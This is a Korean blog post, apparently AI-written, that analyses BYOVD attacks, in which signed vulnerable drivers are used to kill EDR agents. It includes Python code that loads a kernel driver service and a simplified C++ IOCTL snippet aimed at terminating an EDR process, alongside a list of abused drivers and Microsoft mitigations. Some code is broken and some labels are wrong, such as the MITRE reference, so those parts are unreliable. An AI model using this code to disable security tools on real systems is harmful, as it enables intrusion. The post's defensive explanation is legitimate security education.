---
title: "BYOVD 공격: 취약한 드라이버로 EDR 비활성화 기법 분석"
date: 2026-03-23T01:30:08+09:00
draft: false
categories: ["보안"]
tags: ["보안"]
author: "Intelligence Agent"
---

## 서론

한 밤중, 보안 관제 센터(SOC)의 모니터링 화면에서 레드 알람이 울립니다. 중요한 서버의 방화벽이 해제되었고, 메모리에서 정체를 알 수 없는 프로세스가 EDR(엔드포인트 탐지 및 대응) 에이전트를 강제로 종료시켰습니다. 그런데 정체불명의 악성코드나 트로이목마의 흔적은 없습니다. 대신, 유효한 디지털 서명이 된 신뢰할 수 있는 드라이버가 커널 레벨에서 악용되었다는 로그만이 남아 있습니다.

이것이 바로 현대 사이버 공격의 가장 교활한 전술 중 하나인 **BYOVD(Bring Your Own Vulnerable Driver)** 공격의 현장입니다. 최근 The Hacker News의 보고에 따르면, 무려 54종의 EDR 킬러 툴들이 35개의 취약한 드라이버를 악용하여 보안 솔루션을 무력화하고 있는 것으로 밝혀졌습니다.

왜 이 주제가 중요할까요? 전통적인 보안 솔루션은 디지털 서명(Digital Signature)이 된 드라이버를 '신뢰할 수 있는 객체'로 간주합니다. 하지만 공격자는 이 신뢰를 역이용합니다. 이미 서명이 취소되었거나 알려진 취약점이 존재하는 드라이버를 시스템에 강제로 로드시켜, 마치 정상적인 하드웨어 드라이버인 것처럼 위장한 뒤 커널 권한(Ring 0)을 탈취하는 것입니다. 이 방식은 사용자 모드(Ring 3)의 보안 프로그램이 접근할 수 없는 영역에서 치명적인 피해를 입힐 수 있어, 방어자들에게 새로운 과제를 던지고 있습니다.

## 본론

### BYOVD 공격의 기술적 원리와 메커니즘

BYOVD는 "취약한 드라이버를 당신이 직접 가져오라"는 뜻입니다. 공격자는 익스플로잇을 직접 개발하지 않고, 이미 Microsoft나 하드웨어 제조사에 의해 서명된 드라이버 중 취약점이 공개된 것을 찾아냅니다. 이 드라이버는 보안 소프트웨어의 검열을 피해 시스템에 로드될 수 있습니다.

이 공격이 성립하려면 세 가지 핵심 요소가 필요합니다. 1. **취약한 드라이버 확보**: 임의의 커널 메모리 쓰기/읽기 권한이 있는 드라이버가 필요합니다. 2. **드라이버 로딩**: `sc.exe`나 API를 이용해 시스템에 드라이버 서비스를 등록하고 시작합니다. 3. **악의적인 명령 수행**: 커널 권한을 얻어 EDR 프로세스를 종료하거나 보안 기능을 비활성화합니다.

아래는 BYOVD 공격의 전체적인 흐름을 간단하게 도식화한 것입니다.

```javascript
graph TD
    A[Attacker] --> B[Deploy Vulnerable Driver]
    B --> C{Check Driver Signature}
    C -->|Valid Signature| D[Load Driver to Kernel]
    C -->|Invalid| E[Blocked by OS]
    D --> F[Access Kernel Memory]
    F --> G[Terminate EDR Process]
    G --> H[Disable Security Measures]
    H --> I[Execute Payload]
```

이 과정에서 공격자는 주로 **RTCore64.sys**, **DBUtil_2_3.sys**, **capcom.sys**와 같이 알려진 취약 드라이버를 사용합니다. 이 드라이버들은 보통 게임 최적화나 하드웨어 제어를 목적으로 만들어졌으나, 잘못된 접근 제어 로그로 인해 IOCTL(Input/Output Control)을 통해 사용자 모드 애플리케이션이 커널 메모리를 조작할 수 있는 기능을 제공합니다.

### 공격 시나리오 분석 및 코드 예시

방어 목적의 이해를 돕기 위해, 개념 증명(PoC) 수준의 코드를 살펴보겠습니다. 가상의 시나리오는 "취약한 드라이버를 로드하여 EDR 에이전트의 프로세스를 커널 레벨에서 종료하는 것"입니다.

**1. 드라이버 로드 및 커널 핸들 획득**

먼저 공격자는 시스템에 취약한 드라이버를 배포하고 이를 로드합니다. 파이썬의 `wmi` 모듈이나 `ctypes`를 사용하여 드라이버 서비스를 생성할 수 있습니다.

```python
import ctypes
import sys

def load_vulnerable_driver(driver_path, service_name):
    # 드라이버 경로와 서비스 이름 설정
    SC_MANAGER_CREATE_SERVICE = 0x0002
    SERVICE_KERNEL_DRIVER = 0x00000001
    SERVICE_DEMAND_START = 0x00000003
    SERVICE_ERROR_IGNORE = 0x00000000

    # Service Control Manager 열기
    scm_handle = ctypes.windll.advapi32.OpenSCManagerW(None, None, SC_MANAGER_CREATE_SERVICE)
    if not scm_handle:
        print("[!] Failed to open Service Manager")
        return False

    # 드라이버 서비스 생성
    service_handle = ctypes.windll.advapi32.CreateServiceW(
        scm_handle,
        service_name,
        service_name,
        0xF01FF, # All access
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        driver_path,
        None, None, None, None, None
    )

    if not service_handle:
        # 이미 서비스가 존재할 수 있으므로 열어봄
        if ctypes.windll.kernel32.GetLastError() == 1073: # ERROR_SERVICE_EXISTS
            service_handle = ctypes.windll.advapi32.OpenServiceW(scm_handle, service_name, 0xF01FF)
        else:
            print("[!] Failed to create service")
            ctypes.windll.advapi32.CloseServiceHandle(scm_handle)
            return False

    # 드라이버 시작
    if not ctypes.windll.advapi32.StartServiceW(service_handle, 0, None):
        if ctypes.windll.kernel32.GetLastError() != 1055: # ERROR_SERVICE_ALREADY_RUNNING
            print("[!] Failed to start driver")
            ctypes.windll.advapi32.CloseServiceHandle(service_handle)
            ctypes.windll.advapi32.CloseServiceHandle(scm_handle)
            return False

    print(f"[*] Driver {service_name} loaded successfully.")
    return True

# 사용 예시 (학습 목적)
# load_vulnerable_driver("C:\Temp\vuln.sys", "VulnDriver")
```

**2. 커널 모드에서의 프로세스 종료**

드라이버가 로드되면, 공격자는 IOCTL 인터페이스를 통해 커널에 명령을 전송합니다. 특히 `PsTerminateProcess` 같은 커널 함수의 주소를 찾아 EDR 프로세스의 PID(Process ID)와 함께 호출 요청을 보냅니다.

아래는 C++로 작성된 가상의 코드 조각으로, IOCTL을 사용하여 커널 메모리 조작을 시도하는 시나리오입니다.

```c++
#include <Windows.h>
#include <stdio.h>

#define IOCTL_TERMINATE_PROCESS CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

struct KillRequest {
    UINT32 pid;
    UINT64 status;
};

void exploit_kernel_access(HANDLE hDevice, DWORD target_pid) {
    KillRequest request;
    request.pid = target_pid;
    request.status = 0;

    DWORD bytesReturned;
    
    // 디바이스 드라이버에 IOCTL 전송
    BOOL result = DeviceIoControl(
        hDevice, 
        IOCTL_TERMINATE_PROCESS, 
        &request, 
        sizeof(request), 
        NULL, 
        0, 
        &bytesReturned, 
        NULL
    );

    if (result) {
        printf("[+] Process %d termination request sent to kernel.
", target_pid);
    } else {
        printf("[-] Failed to communicate with driver. Error: %d
", GetLastError());
    }
}

int main() {
    // 취약한 드라이버와의 통신을 위한 핸들 오픈
    HANDLE hDevice = CreateFile(
        L"\\.\VulnDeviceName", 
        GENERIC_READ | GENERIC_WRITE, 
        0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open device. Is driver loaded?
");
        return 1;
    }

    // 타겟 EDR 프로세스 PID (가상의 값)
    DWORD target_edr_pid = 1234; 
    exploit_kernel_access(hDevice, target_edr_pid);

    CloseHandle(hDevice);
    return 0;
}
```

이 코드는 설명을 위해 극도로 단순화되었습니다. 실제 공격에서는 드라이버가 제공하는 취약한 IOCTL을 찾아내고, 이를 통해 `MmCopyVirtualMemory`와 같은 함수로 EDR의 코드 섹션을 패치하거나 `EPROCESS` 구조체를 수정하여 보안 스레드가 작동하지 않도록 막습니다.

### 주요 악용 드라이버 및 현황 분석

최근 분석된 54개의 툴과 35개의 드라이버는 서로 다른 그룹에 의해 독립적으로 발견되었으나, 그 공격 패턴은 매우 유사합니다. 주로 악용되는 드라이버와 그 특징은 다음과 같습니다.

| 드라이버 이름 (예시) | 원래 용도 | 주요 취약점 | 악용 방식 | | :--- | :--- | :--- | :--- | | RTCore64.sys | MSI 마더보드 오버클러킹 유틸리티 | IOCTL을 통한 임의 메모리 쓰기 | 커널 코드 패치, 프로세스 종료 | | DBUtil_2_3.sys | Dell BIOS 업데이트 유틸리티 | 임의 포인터 쓰기 권한 | 보안 소프트웨어 우회, 권한 상승 | | Capcom.sys | Capcom 게임 관련 드라이버 | 잘못된 서명 확인 로직 | 임의 코드 실행(테스트 목적으로 공개됨) | | EnchantedAppSvc.sys | ASUS 장치 관리 | 임의 메모리 읽기/쓰기 | EDR 후킹 제거 |

이러한 드라이버들은 보통 CVE(Common Vulnerabilities and Exposures)에 등록된 이후에도 인터넷상에 널리 퍼져 있어, 공격자들이 쉽게 다운로드하여 재사용합니다.

### 완화 조치 및 방어 전략 (Mitigation)

BYOVD 공격은 기존의 백신이나 EDR이 '화이트 리스트'에 있는 드라이버를 통과시킨다는 점을 이용하므로, 단순 시그니처 기반 탐지로는 막기 어렵습니다. 효과적인 방어를 위해서는 **Driver Blocklist(차단 목록)**와 **행동 기반 탐지**가 필수적입니다.

#### 1. 취약한 드라이버 차단 (Microsoft ASR Rules)

Microsoft는 이러한 취약한 드라이버들이 로드되는 것을 막기 위해 ASR(Attack Surface Reduction) 규칙을 제공합니다. 특히 "Block abuse of exploited vulnerable signed drivers" 규칙을 활성화해야 합니다.

**PowerShell을 통한 ASR 규칙 활성화:**

```plain text
# 관리자 권한 PowerShell 실행
Set-MpPreference -AttackSurfaceReductionRules_Ids 56a863a9-875e-4185-98a7-b882c64b5ce2 -AttackSurfaceReductionRules_Actions Enabled
```

이 규칙은 알려진 취약 드라이버의 해시(Hash) 목록을 가지고 있고, 해당 드라이버가 로드되려고 시도하면 커널 레벨에서 즉시 차단합니다.

#### 2. 드라이버 서명 정책 강화 (HVCI)

Hyper-V Code Integrity(HVCI) 또는 Memory Integrity를 활성화하면, 커널 메모리에 로드되는 모든 드라이버가 Microsoft의 정책을 엄격히 준수하는지 검증합니다. 취약한 드라이버 중 대다수는 HVCI 환경에서는 로드가 불가능합니다.

**설정 경로:** Windows 설정 > 업데이트 및 보안 > Windows 보안 > 장치 보안 > 코어 격리 > 메모리 무결성 > 켜기

#### 3. LSASS 보안 강화

BYOVD 공격의 주 목적은 종종 자격 증명 도난(Lsass.exe 덤프)입니다. 이를 방지하기 위해 Protected Process Light(PPL)를 활성화하여 lsass.exe를 보호해야 합니다.

**레지스트리 설정 (RunAsPPL 활성화):**

```plain text
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "RunAsPPL" /t REG_DWORD /d 1 /f
```

## 결론

BYOVD 공격은 "신뢰"라는 보안의 근간을 뒤틀어버리는 정교한 기법입니다. 공격자는 제로데이 취약점을 개발할 필요 없이, 이미 존재하는 서명된 드라이버를 무기로 삼아 최신 EDR을 무력화하고 있습니다. 최근 54개의 툴이 발견된 것은 이러한 공격이 이미 산업화되고 모듈화되었음을 시사합니다.

핵심 요약하자면, 보안 팀은 더 이상 '서명된 것'을 믿어서는 안 됩니다. 마이크로소프트의 ASR 규칙을 적극적으로 도입하고, 취약 드라이버 블록 리스트를 최신 상태로 유지하며, HVCI를 통해 커널 무결성을 검증하는 것만이 이 교묘한 공격을 막을 수 있는 유일한 길입니다.

전문가 인사이트로서, 앞으로의 보안은 "커널 레벨의 가시성(Visibility)" 확보가 핵심이 될 것입니다. EDR 벤더들 역시 단순히 드라이버 로드를 감지하는 것을 넘어, 드라이버의 동작 패턴(예: `PsSetLoadImageNotifyRoutine`을 남용하는지 등)을 실시간으로 분석하는 ETW(Event Tracing for Windows) 기반의 기술로 발전해야 합니다.

**참고자료:**
- [The Hacker News - 54 EDR Killers Use BYOVD...](https://thehackernews.com/2023/09/54-edr-killers-use-byovd-to-exploit-35.html)
- [Microsoft Docs - Attack surface reduction rules](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules)
- [MITRE ATT&CK - Signed Binary Proxy Execution](https://attack.mitre.org/techniques/T1547/006/)

---

**출처**: [https://news.google.com/rss/articles/CBMigwFBVV95cUxOMTRPQnBzdE1yOUNkdkEyaFpYa0V2TFpmN1hUVDBENWhpa2loVHFsbEdHeUpxOHZ3M2MzTFRDS2owenVZS08tOGtPWkxuektRQnRMblBidFpWeF96bEdHbFFaUzJ6RFlVSm1xN21YZDVUSl9wbXNtNks0dFVUdDRWQ1o1SQ?oc=5](https://news.google.com/rss/articles/CBMigwFBVV95cUxOMTRPQnBzdE1yOUNkdkEyaFpYa0V2TFpmN1hUVDBENWhpa2loVHFsbEdHeUpxOHZ3M2MzTFRDS2owenVZS08tOGtPWkxuektRQnRMblBidFpWeF96bEdHbFFaUzJ6RFlVSm1xN21YZDVUSl9wbXNtNks0dFVUdDRWQ1o1SQ?oc=5)